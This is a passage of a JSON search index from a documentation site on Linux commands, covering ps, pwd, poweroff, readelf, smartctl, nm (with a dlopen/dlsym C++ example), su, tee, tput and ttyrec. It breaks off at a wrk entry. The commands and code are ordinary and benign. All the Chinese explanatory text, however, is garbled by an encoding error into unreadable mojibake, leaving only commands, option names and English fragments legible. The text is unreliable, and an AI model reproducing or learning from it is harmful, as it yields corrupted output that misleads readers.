åƒµå°¸è¿›ç¨‹ï¼Œè¿›ç¨‹å·²ç»ˆæ­¢ï¼Œä½†è¿›ç¨‹æè¿°ç¬¦å­˜åœ¨ï¼Œç›´åˆ°çˆ¶è¿›ç¨‹è°ƒç”¨wait4()ç³»ç»Ÿè°ƒç”¨åé‡Šæ”¾ W æ²¡æœ‰è¶³å¤Ÿçš„è®°å¿†ä½“åˆ†é¡µå¯åˆ†é… ï¼Œæ­£åœ¨æ¢é¡µï¼ˆ2.6å†…æ ¸ä¹‹å‰æœ‰æ•ˆï¼‰ æ³¨è§£ å…³äºgrepæœç´¢è¿›ç¨‹æ—¶, æ’å‡ºè‡ªèº«, è§ GrepExclude","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PS.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PS.html"},{"title":"pwd","text":"print working directory æ˜¾ç¤ºå½“å‰è·¯å¾„ -P æ˜¾ç¤ºçœŸå®è·¯å¾„ è€Œéé“¾æ¥è·¯å¾„","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PWD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PWD.html"},{"title":"poweroff","text":"poweroff ä¼šå‘é€ä¸€ä¸ª ACPI ä¿¡å·æ¥é€šçŸ¥ç³»ç»Ÿå…³æœº: # poweroff ### å…³é—­æœºå™¨ã€å…³é—­ç”µæº # poweroff --halt ### åœæ­¢æœºå™¨ # poweroff --reboot ### é‡å¯æœºå™¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Poweroff.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Poweroff.html"},{"title":"readelf","text":"å‚è€ƒ: elfæ–‡ä»¶è¯´æ˜åŠä»‹ç»: https://zhuanlan.zhihu.com/p/112754720 https://www.jianshu.com/p/0599d846e1df https://zhuanlan.zhihu.com/p/30516267 ç”¨äºæ˜¾ç¤º elf æ ¼å¼æ–‡ä»¶çš„ä¿¡æ¯ã€‚ è¯­æ³•: readelf elf-file(s) readelf ç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªæˆ–è€…å¤šä¸ª elf æ ¼å¼çš„ç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯ï¼Œ å¯ä»¥é€šè¿‡å®ƒçš„é€‰é¡¹æ¥æ§åˆ¶æ˜¾ç¤ºå“ªäº›ä¿¡æ¯ã€‚è¿™é‡Œçš„ elf-file(s) å°±è¡¨ç¤ºé‚£äº›è¢«æ£€æŸ¥çš„æ–‡ä»¶ã€‚ å¯ä»¥æ”¯æŒ32ä½ï¼Œ64ä½çš„ elf æ ¼å¼æ–‡ä»¶ï¼Œä¹Ÿæ”¯æŒåŒ…å« elf æ–‡ä»¶çš„æ–‡æ¡£ ï¼ˆè¿™é‡Œä¸€èˆ¬æŒ‡çš„æ˜¯ä½¿ç”¨ ar å‘½ä»¤å°†ä¸€äº› elf æ–‡ä»¶æ‰“åŒ…ä¹‹åç”Ÿæˆçš„ä¾‹å¦‚ lib*.a ä¹‹ç±»çš„\"é™æ€åº“\"æ–‡ä»¶ï¼‰ã€‚ ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/objdump æœ‰ç‚¹ç±»ä¼¼ é€‰é¡¹(å¸¸ç”¨): -a æ˜¾ç¤ºsoæ–‡ä»¶æ‰€ä»¥ä¿¡æ¯ -h ELFæ–‡ä»¶å¤´ -l program-headers é™æ€åŠ è½½åˆ†ææ—¶éœ€è¦çš„ä¿¡æ¯ -S section-headers é™æ€åŠ è½½åˆ†ææ—¶éœ€è¦çš„ä¿¡æ¯ -e å¤´ä¿¡æ¯ï¼Œelf headerï¼Œsection headerï¼Œprogram header -s æ˜¾ç¤ºç¬¦å·è¡¨ -d æ˜¾ç¤ºåŠ¨æ€èŠ‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readel.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readel.html"},{"title":"smartctl","text":"åŠŸèƒ½ smartctl å·¥å…·ç”¨æ¥å®ç°æ“ä½œç³»ç»Ÿä¸Šçš„ ATA/SATA ã€SCSI/SASã€SSD ç­‰ç‰©ç†è®¾å¤‡çš„ç›‘æ§ã€åˆ†æåŠä½¿ç”¨æƒ…å†µæŠ¥å‘Šã€‚ SMART æŒ‡çš„æ˜¯å¯¹ç¡¬ç›˜ç­‰è®¾å¤‡çš„å¯é æ€§ç›‘æ§åŠé¢„æµ‹ç£ç›˜å¯èƒ½å­˜åœ¨çš„æ•…éšœï¼Œå¹¶æ ¹æ®ç¡¬ç›˜å½¢æ€è¿›è¡Œä¸åŒç¨‹åº¦çš„è‡ªæ£€ã€‚ smartctl çš„ç‰ˆæœ¬å¯ä»¥å…¼å®¹ä¼—å¤šç£ç›˜è§„èŒƒï¼Œä¾‹å¦‚ ACS-2ã€ATA8-ACSã€ATA/ATAPI-7 åŠæ›´æ—©æœŸçš„ä¸€äº›ç£ç›˜æ ‡å‡†ã€‚ æ³¨è§£ å¤§å¤šå‘è¡Œç‰ˆå·²ç»å†…ç½®, è‹¥æ²¡æœ‰, å¯æ‰‹åŠ¨å®‰è£…: apt install smartmontools smartmontools æä¾›äº†ä¸¤ç§ä½¿ç”¨æ¨¡å¼ ä»¥æœåŠ¡æ¨¡å¼è¿è¡Œ: é€šè¿‡ smartd æœåŠ¡åŠé…ç½®æ–‡ä»¶æ¥å¯¹æœåŠ¡å™¨ä¸Šçš„ç£ç›˜æŒ‰ç…§è§„åˆ™è¿›è¡Œè‡ªæ£€ï¼Œéœ€è¦å¼€å¯ smartd.service æœåŠ¡ ä»¥å‘½ä»¤è¡Œæ¨¡å¼è¿è¡Œ: ä»¥ç»ˆç«¯å‘½ä»¤è¡Œçš„æ–¹å¼å¯¹ç£ç›˜è¿›è¡Œè‡ªæ£€ï¼Œæ— éœ€å¼€å¯ smartd æœåŠ¡ æ³¨è§£ Macå¯é€šè¿‡: brew install smartmontools æ¥å®‰è£…, å¹¶æŸ¥çœ‹å›ºæ€å¯¿å‘½ é€‰é¡¹å‚æ•° åŸºæœ¬å‘½ä»¤å‚æ•°é€‰é¡¹(éƒ¨åˆ†) é€‰é¡¹ è¯´æ˜ -h, --help, --usage Display this help and exit -V, --version, --copyright, --license Print license, copyright, and version information and exit -i, --info æ˜¾ç¤ºè®¾å¤‡åŸºæœ¬ä¿¡æ¯ --identify[=[w][nvb]] Show words and bits from IDENTIFY DEVICE data (ATA) -g NAME, --get=NAME Get device setting. all, aam, apm, dsn, lookahead, security, wcache, rcache, wcreorder, wcache-sct -a, --all Show all SMART information for device -x, --xall Show all information for device --scan æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰è®¾å¤‡ --scan-open Scan for devices and try to open each device -H, --health æ£€æŸ¥å¥åº·çŠ¶æ€ -t TEST, --test=TEST Run test. TEST. offline, short, long, conveyance, force, vendor,N, select,M-N, pending,N, afterselect,[on|off] -a è¾“å‡ºä¿¡æ¯è¯´æ˜ ä¸¥é‡è­¦å‘Šï¼ˆCritical Warningï¼‰ ä¼šæ˜¾ç¤ºæ§åˆ¶å™¨çŠ¶æ€è­¦å‘Šè®¯æ¯ï¼Œå¦‚æœéƒ½æ˜¾ç¤º0x00 å°±è¡¨ç¤ºæ²¡äº‹ æ¸©åº¦ï¼ˆTemperatureï¼‰ ä¼šæ˜¾ç¤ºå½“å‰SSD æ¸©åº¦èµ„è®¯ å¯ç”¨å¤‡ç”¨ç©ºé—´ï¼ˆAvailable Spareï¼‰ SSD å‰©ä½™ç©ºé—´ç™¾åˆ†æ¯” å¯ç”¨å¤‡ç”¨ä¸´ç•Œå€¼ï¼ˆAvailable Spare Thresholdï¼‰ ä¸´ç•Œå€¼å…¨ç”±å‚å•†å®šä¹‰ å¯¿å‘½ç™¾åˆ†æ¯”ï¼ˆPercentage Usedï¼‰ ç›®å‰SSD å¯¿å‘½ç™¾åˆ†æ¯”æ•°å€¼ï¼Œå…·ä½“å–å†³äºå®é™…è®¾å¤‡ä½¿ç”¨æƒ…å†µå’Œå‚å•†å¯¹è®¾å¤‡å¯¿å‘½çš„é¢„æµ‹ã€‚ èµ„æ–™è¯»å–ï¼ˆData Units Readï¼‰ è®°å½•ç”µè„‘ä»SSDè¯»å–512å­—èŠ‚æ•°æ®å•å…ƒçš„æ€»é‡ï¼Œæ¯1000ä¸ªå•å…ƒè®°å½•ä¸€æ¬¡ï¼Œå³è¿™é¡¹Rawæ•°æ®1çš„å€¼ç­‰äº500KBã€‚ èµ„æ–™å†™å…¥ï¼ˆData Units Readï¼‰ å¦‚ä¸Šï¼Œå°±æ˜¯å†™å…¥æ€»é‡ã€‚ ä¸»æœºè¯»å–å‘½ä»¤ï¼ˆHost Read Commandsï¼‰ ä¸»æ§æ”¶åˆ°çš„è¯»å–å‘½ä»¤æ•°é‡ã€‚ ä¸»æœºå†™å…¥å‘½ä»¤ï¼ˆHost Write Commandsï¼‰ ä¸»æ§æ”¶åˆ°çš„å†™å…¥å‘½ä»¤æ•°é‡ã€‚ æ§åˆ¶å™¨å¿™ç¢Œæ—¶é—´ï¼ˆController Busy Timeï¼‰ ä¸»æ§å¿™äºI/Oå‘½ä»¤çš„æ—¶é—´ã€‚ æ„å¤–å…³æœºï¼ˆUnsafe Shutdownsï¼‰ çºªå½•ä¸æ­£å¸¸æ–­ç”µæ¬¡æ•° åª’ä½“å’Œèµ„æ–™å®Œæ•´æ€§é”™è¯¯ï¼ˆMedia and Data Integrity Errorsï¼‰ ä¸»æ§æ£€æµ‹å¾—åˆ°çš„æœªæ¢å¤çš„æ•°æ®å®Œæ•´æ€§é”™è¯¯æ¬¡æ•°ã€‚ é”™è¯¯èµ„æ–™çºªå½•ï¼ˆNumber of Error Information Log Entriesï¼‰ ä¸»æ§æ€»å…±æ”¶åˆ°çš„é”™è¯¯ä¿¡æ¯æ—¥å¿—æ•°é‡ã€‚ ç¤ºä¾‹ # æ£€æŸ¥ç£ç›˜å¥åº·çŠ¶æ€ smartctl -H /dev/sda # ç„¶åæŸ¥çœ‹ç£ç›˜è¯¦ç»†æƒ…å†µ smartctl -a /dev/sda # å†å¯¹ç£ç›˜è¿›è¡ŒçŸ­æœŸæµ‹è¯• smartctl -t short /dev/sda # æŸ¥çœ‹ç£ç›˜æµ‹è¯•ç»“æœ, åŸºæœ¬ç£ç›˜å¥åº·çŠ¶æ€å°±å¯ä»¥å®šä½å‡ºæ¥ smartctl -l selftest /dev/sda # æœ€åæ£€æŸ¥ç£ç›˜é”™è¯¯æ—¥å¿— smartctl -l error /dev/sdb","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SmartCTL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SmartCTL.html"},{"title":"nm","text":"linuxä¸‹è‡ªå¸¦çš„ç‰¹å®šæ–‡ä»¶åˆ†æå·¥å…·ï¼Œ ä¸€èˆ¬ç”¨æ¥æ£€æŸ¥åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨ï¼Œè¿”å›äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å„æ®µçš„ä¿¡æ¯ã€‚ ç›®æ ‡æ–‡ä»¶ã€åº“æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ é¦–å…ˆï¼Œæåˆ°è¿™ä¸‰ç§æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸å¾—ä¸æçš„å°±æ˜¯gccçš„ç¼–è¯‘æµç¨‹ï¼šé¢„ç¼–è¯‘ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–ï¼Œé“¾æ¥ã€‚ ç›®æ ‡æ–‡ä»¶ å¸¸è¯´çš„ç›®æ ‡æ–‡ä»¶æ˜¯æˆ‘ä»¬çš„ç¨‹åºæ–‡ä»¶(.c/.cpp,.h)ç»è¿‡ é¢„ç¼–è¯‘ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–è¿‡ç¨‹ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶,ä¸ç»è¿‡é“¾æ¥è¿‡ç¨‹ï¼Œç¼–è¯‘ç”ŸæˆæŒ‡ä»¤ä¸º: gcc(g++) -c file.c(file.cpp) å°†ç”Ÿæˆå¯¹åº”çš„file.oæ–‡ä»¶,file.oå³ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ åº“æ–‡ä»¶ åˆ†ä¸ºé™æ€åº“å’ŒåŠ¨æ€åº“ï¼Œè¿™é‡Œä¸åšè¿‡å¤šä»‹ç»ï¼Œåº“æ–‡ä»¶æ˜¯ç”±å¤šä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ‰“åŒ…è€Œæˆï¼Œç”Ÿæˆçš„.aæ–‡ä»¶ï¼Œ ç¤ºä¾‹: ar -rsc liba.a test1.o test2.o test3.o å°†test1.o test2.o test3.oä¸‰ä¸ªæ–‡ä»¶æ‰“åŒ…æˆliba.aåº“æ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶æ˜¯ç”±å¤šä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–è€…åº“æ–‡ä»¶(ç”±ä¸Šæ‰€å¾—ï¼Œåº“æ–‡ä»¶å…¶å®æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶çš„é›†åˆ) ç»è¿‡é“¾æ¥è¿‡ç¨‹ç”Ÿæˆçš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯¹åº”windowsä¸‹çš„.exeæ–‡ä»¶ï¼Œ å¯æ‰§è¡Œæ–‡ä»¶ä¸­æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªmain()å‡½æ•°(ç”¨æˆ·ç¨‹åºå…¥å£ï¼Œä¸€èˆ¬ç”±bootloaderæŒ‡å®šï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ”¹)ï¼Œ ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å’Œåº“æ–‡ä»¶ä¸­æ˜¯ä¸åŒ…å«main()å‡½æ•°çš„ï¼Œ ä½†æ˜¯åœ¨linuxä¸‹ç”¨æˆ·æœ‰ç»å¯¹çš„è‡ªç”±ï¼Œåšä¸€ä¸ªåŒ…å«mainå‡½æ•°çš„åº“æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„, ä½†è¿™ä¸å±äºå¸¸è§„æ“ä½œï¼Œä¸ä½œè®¨è®ºã€‚ ä¸Šè¿°ä¸‰ç§æ–‡ä»¶çš„æ ¼å¼éƒ½æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦ç”¨åˆ°nm åœ¨ä¸Šè¿°æåˆ°çš„ä¸‰ç§æ–‡ä»¶ä¸­ï¼Œç”¨ç¼–è¾‘å™¨æ˜¯æ— æ³•æŸ¥çœ‹å…¶å†…å®¹çš„(ä¹±ç )ï¼Œ æ‰€ä»¥å½“æˆ‘ä»¬æœ‰è¿™ä¸ªéœ€æ±‚(ä¾‹å¦‚debugï¼ŒæŸ¥çœ‹å†…å­˜åˆ†å¸ƒçš„æ—¶å€™) å»æŸ¥çœ‹ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é‡ŒåŒ…å«äº†å“ªäº›å†…å®¹æ—¶ï¼Œè¿™æ—¶å€™å°±å°†ç”¨åˆ°ä¸€äº›ç‰¹æ®Šå·¥å…·ï¼Œ linuxä¸‹çš„nmå‘½ä»¤å°±å¯ä»¥å®Œå…¨èƒœä»»(åŒæ—¶è¿˜æœ‰objdumpå’Œreadelfå·¥å…·ï¼Œè¿™é‡Œæš‚ä¸ä½œè®¨è®º)ã€‚ nmçš„å¸¸ç”¨å‘½ä»¤å‚æ•° -A , -o , --print-file-name æ‰“å°å‡ºæ¯ä¸ªç¬¦å·å±äºçš„æ–‡ä»¶ -a , --debug-syms æ‰“å°å‡ºæ‰€æœ‰ç¬¦å·ï¼ŒåŒ…æ‹¬debugç¬¦å· -B BSDç æ˜¾ç¤º -C, --demangle[=style] å¯¹ä½çº§ç¬¦å·åç§°è¿›è¡Œè§£ç ï¼Œ C++æ–‡ä»¶éœ€è¦æ·»åŠ (ä¸ç„¶çœ‹C++ç¼–è¯‘å¥½çš„å†…å®¹å°±æ˜¯ç¼–ç çš„) --no-demangle ä¸å¯¹ä½çº§ç¬¦å·åç§°è¿›è¡Œè§£ç ï¼Œé»˜è®¤å‚æ•° -D , --dynamic æ˜¾ç¤ºåŠ¨æ€ç¬¦å·è€Œä¸æ˜¾ç¤ºæ™®é€šç¬¦å·ï¼Œä¸€èˆ¬ç”¨äºåŠ¨æ€åº“ -f format , --format= format æ˜¾ç¤ºçš„å½¢å¼ï¼Œé»˜è®¤ä¸ºbsdï¼Œå¯é€‰ä¸ºsysvå’Œposix -g , --extern-only ä»…æ˜¾ç¤ºå¤–éƒ¨ç¬¦å· -h , --help å›½é™…æƒ¯ä¾‹ï¼Œæ˜¾ç¤ºå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ -n , -v , --numeric-sort æ˜¾ç¤ºçš„ç¬¦å·ä»¥åœ°å€æ’åºï¼Œè€Œä¸æ˜¯åç§°æ’åº -p , --no-sort ä¸å¯¹æ˜¾ç¤ºå†…å®¹è¿›è¡Œæ’åº -P , --portability ä½¿ç”¨POSIX.2æ ‡å‡† -V , --version å›½é™…ç®¡ç†ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬ --defined-only ä»…æ˜¾ç¤ºå®šä¹‰çš„ç¬¦å·(Display only defined symbols for each object file) å¯¹-Cè§£ç C++çš„è¯´æ˜ æ¯”å¦‚æºç å®šä¹‰äº†addå‡½æ•°: int add(int a, int b){return a+b;} ç¼–è¯‘ä¸ºåŠ¨æ€åº“æ–‡ä»¶(Macä¸‹ä¸çŸ¥é“ä¸ºä»€ä¹ˆåƒæ˜¯ä¸ªå‡çš„åŠ¨æ€åº“, å› ä¸ºæ²¡æœ‰åŠ¨æ€åº“ç¬¦å·è¡¨): g++ -std=c++11 -dynamiclib -o libtest2.dylib test2.cpp ç„¶å nmä¸å¸¦CæŸ¥çœ‹: $ nm -n libtest2.dylib 0000000000003d80 T __Z3addii nmå¸¦CæŸ¥çœ‹: $ nm -n -C libtest2.dylib 0000000000003d80 T add(int, int) å…³äºè¾“å‡ºæ•°æ®çš„è¯´æ˜ ä»¥ä¸Šä¸ºä¾‹: 0000000000003d80 T add(int, int) ç¬¬ä¸€åˆ—: åç§»åœ°å€ ç¬¬äºŒåˆ—: å½“å‰æ¡ç›®æ‰€å¯¹åº”çš„å†…å­˜æ‰€åœ¨éƒ¨åˆ† ç¬¬ä¸‰åˆ—: ç¬¦å·å†…å®¹ å­—ç¬¦æ‰€å¯¹åº”çš„å«ä¹‰: A ï¼šç¬¦å·çš„å€¼æ˜¯ç»å¯¹å€¼ï¼Œä¸ä¼šè¢«æ›´æ”¹ Bæˆ–b ï¼šæœªè¢«åˆå§‹åŒ–çš„å…¨å±€æ•°æ®ï¼Œæ”¾åœ¨.bssæ®µ Dæˆ–d ï¼šå·²ç»åˆå§‹åŒ–çš„å…¨å±€æ•°æ® Gæˆ–g ï¼šæŒ‡è¢«åˆå§‹åŒ–çš„æ•°æ®ï¼Œç‰¹æŒ‡small objects I ï¼šå¦ä¸€ä¸ªç¬¦å·çš„é—´æ¥å‚è€ƒ N ï¼šdebugging ç¬¦å· p ï¼šä½äºå †æ ˆå±•å¼€éƒ¨åˆ† Ræˆ–r ï¼šå±äºåªè¯»å­˜å‚¨åŒº Sæˆ–s ï¼šæŒ‡ä¸ºåˆå§‹åŒ–çš„å…¨å±€æ•°æ®ï¼Œç‰¹æŒ‡small objects Tæˆ–t ï¼šä»£ç æ®µçš„æ•°æ®ï¼Œ.testæ®µ U ï¼šç¬¦å·æœªå®šä¹‰ Wæˆ–w ï¼šç¬¦å·ä¸ºå¼±ç¬¦å·ï¼Œå½“ç³»ç»Ÿæœ‰å®šä¹‰ç¬¦å·æ—¶ï¼Œä½¿ç”¨å®šä¹‰ç¬¦å·ï¼Œå½“ç³»ç»Ÿæœªå®šä¹‰ç¬¦å·ä¸”å®šä¹‰äº†å¼±ç¬¦å·æ—¶ï¼Œä½¿ç”¨å¼±ç¬¦å·ã€‚ ï¼Ÿ ï¼šunknownç¬¦å· å‚è€ƒ: linuxä¸‹å¼ºå¤§çš„æ–‡ä»¶åˆ†æå·¥å…· -- nm å…³äºç¬¦å·è¡¨è¯´æ˜ ä¸»è¦æ˜¯é’ˆå¯¹C++æ–‡ä»¶çš„ç¼–è¯‘ ä»¥ä¸‹é¢æ•°æ®ä¸ºä¾‹ æºç ä¸º: int add(int a, int b){ int tmp = a + 3; return tmp + b; } extern \"C\"{ int add2(int a, int b){ return a+b+10;} } extern \"C\" è¡¨ç¤ºä½¿ç”¨Cæ ‡å‡†å¯¼å‡ºå‡½æ•°, æ„æ€æ˜¯ä¸ä¼šå¯¹å‡½æ•°åç§°è¿›è¡Œä¿®é¥° ç¼–è¯‘æŒ‡ä»¤: g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp ä½¿ç”¨nmæŸ¥çœ‹ä¿¡æ¯: $ nm -n -U libtest2.dylib 0000000000003d60 T __Z3addii 0000000000003d80 T _add2 å¯¹å…¶è¿›è¡Œè§£ç : $ nm -n -CU libtest2.dylib 0000000000003d60 T add(int, int) 0000000000003d80 T _add2 å¦‚æœè¦åœ¨å…¶ä»–åœ°æ–¹è¿›è¡Œæå–, å¦‚: // å®šä¹‰åŸå§‹å‡½æ•°æŒ‡é’ˆç±»å‹ typedef int (*OrigAddFunc)(int a, int b); // å®šä¹‰å…¨å±€å˜é‡å­˜å‚¨åŸå§‹å‡½æ•°æŒ‡é’ˆ OrigAddFunc origAdd = NULL; void* handle = dlopen(\"./libtest2.dylib\", RTLD_LAZY); if (handle == NULL) { printf(\"æ— æ³•æ‰“å¼€å½“å‰å¯æ‰§è¡Œæ–‡ä»¶\\n, info: %s\\n\", dlerror()); return 1; } origAdd = (OrigAddFunc)dlsym(handle, \"_Z3addii\"); if (origAdd == NULL) { printf(\"æ— æ³•è·å–åŸå§‹å‡½æ•°åœ°å€\\n, info: %s\\n\", dlerror()); dlclose(handle); return 1; } ä¸»è¦æ˜¯ (OrigAddFunc)dlsym(handle, \"_Z3addii\"); , dlsymæ˜¯é’ˆå¯¹åº“æ–‡ä»¶çš„å‡½æ•°åè¿›è¡Œå¯»æ‰¾, C++é»˜è®¤ä¼šè¿›è¡Œå‡½æ•°åä¿®å£«, æ‰€ä»¥å¦‚æœè¦æ‰¾ add å‡½æ•°, å¾—å…ˆç”¨ nm æ‰¾å‡ºä¿®é¥°åçš„åç§° _Z3addii (è¾“å‡ºå»æ‰ä¸‹åˆ’çº¿), ä½¿ç”¨è§£æåçš„æ˜¯ä¸è¡Œçš„ å¦‚æœæ˜¯ add2, æºç å·²ç»ç”¨ extern \"C\" æŒ‡å®šä½¿ç”¨Cæ ‡å‡†å¯¼å‡º, å°±å¯ç›´æ¥ dlsym(handle, \"add2\")","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-So.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-So.html"},{"title":"su","text":"ç”¨æˆ·åˆ‡æ¢ ç”¨æ³•: su [options] [-] [<user> [<argument>...]] -l æˆ–è€…ç›´æ¥ - , è¡¨ç¤ºä½¿ç”¨ç™»å½•shell, å¯ä»¥å®Œå…¨åŠ è½½æŒ‡å®šç”¨æˆ·çš„ç¯å¢ƒ æ³¨è§£ è¿™é‡Œç®€å•æä¸€ä¸‹ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/sudo ç›¸å…³çš„, sudo -i ä¹Ÿå¯ä»¥åˆ‡æ¢åˆ°rootç”¨æˆ·, ä¸è¿‡åˆ‡æ¢è¿‡å»ååªæ˜¯åŠ è½½rootåˆ°ç¯å¢ƒå˜é‡, å¹¶ä¸æ˜¯å®Œå…¨åŠ è½½ç¯å¢ƒ. ä¸”æ‰§è¡Œçš„å‘½ä»¤é»˜è®¤ä¼šæœ‰æ—¥å¿—è®°å½•åœ¨ /var/log/sudo/ , ä¾¿äºå®¡è®¡, æ›´å®‰å…¨.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sovereign.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Sovereign.html"},{"title":"tee","text":"è¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶(åŒæ—¶è¾“å‡ºåˆ°ç»ˆç«¯ä¸æ–‡ä»¶)ã€‚ è¯­æ³•: tee [-ai][--help][--version][æ–‡ä»¶...] å‚æ•° -a,--append é™„åŠ åˆ°æ—¢æœ‰æ–‡ä»¶çš„åé¢ï¼Œè€Œéè¦†ç›–å®ƒï¼ -i,--ignore-interrupts å¿½ç•¥ä¸­æ–­ä¿¡å·ã€‚ --help åœ¨çº¿å¸®åŠ©ã€‚ --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ å®ä¾‹ å°† ls çš„ç»“æœåŒæ—¶è¾“å‡ºåˆ°å±å¹•ä¸æ–‡ä»¶: â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ ls -lh total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ ls -lh | tee t.log total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 -rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log â”Œâ”€â”€(yanqueã‰¿3675b5ebb8ce)-[~/test] â””â”€$ cat t.log total 8.0K -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1 -rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2 -rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log æ³¨è§£ å¦‚æœåªæ˜¯ä½¿ç”¨ tee, ä¼šæ‰“å¼€ä¸€ä¸ªäº¤äº’çª—å£, åœ¨é‡Œé¢è¾“å…¥éœ€è¦å†™å…¥çš„å†…å®¹, é€€å‡ºç›´æ¥ ctrl + c å³å¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TEE.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TEE.html"},{"title":"tput","text":"åŠŸèƒ½ tput å‘½ä»¤ä¼šåˆ©ç”¨ terminfo æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œæ¥æ§åˆ¶å’Œæ›´æ”¹æˆ‘ä»¬çš„ç»ˆç«¯ï¼Œæ¯”å¦‚æ§åˆ¶å…‰æ ‡ã€æ›´æ”¹æ–‡æœ¬å±æ€§ã€æ§åˆ¶å±å¹•ï¼Œä»¥åŠä¸ºæ–‡æœ¬æ¶‚è‰²ã€‚ å…¶ä¸­ï¼Œä¸ºæ–‡æœ¬æ¶‚è‰²çš„æ–¹æ³•æ˜¯: tput setab <color_int>ï¼šç”¨äºè®¾ç½®èƒŒæ™¯è‰² tput setaf <color_int>ï¼šç”¨äºè®¾ç½®å‰æ™¯è‰² tput sgr0ï¼šè¡¨ç¤ºé¢œè‰²é‡ç½® æ•°å€¼å®šä¹‰å¦‚ä¸‹ æ•°å€¼ å«ä¹‰ 0 é»‘ 1 çº¢ 2 ç»¿ 3 é»„ 4 è“ 5 æ´‹çº¢ 6 é»„ 7 ç™½","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TPUT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TPUT.html"},{"title":"ttyrec","text":"ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/script , /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/asciinema ç±»ä¼¼, æ˜¯ ttygif é…å¥—çš„å·¥å…·, ç”¨äºå½•åˆ¶ text/x-script æ–‡ä»¶ text/x-script æ–‡ä»¶: ä¿å­˜äº†ç»ˆç«¯æŸæ®µæ—¶é—´çš„æ‰§è¡Œæƒ…å†µ, å¯ç”¨æˆ·å¤ç°, æ¯”å¦‚ç”Ÿæˆgifå›¾(éœ€è¦ä½¿ç”¨ttygif) å®‰è£…: ä¸ ttygif å®‰è£…ä¸€è‡´, è£…å¥½ ttygif é»˜è®¤ä¼šå¸¦ä¸Š ttyrec","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TTYRC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-TTYRC.html"},{"title":"wrk","text":"è½»é‡çº§æ€§èƒ½å‹æµ‹å·¥å…· å¯ä»¥ç”¨æ¥æµ‹è¯•æ¥å£çš„æ€§èƒ½å¦‚ä½•, 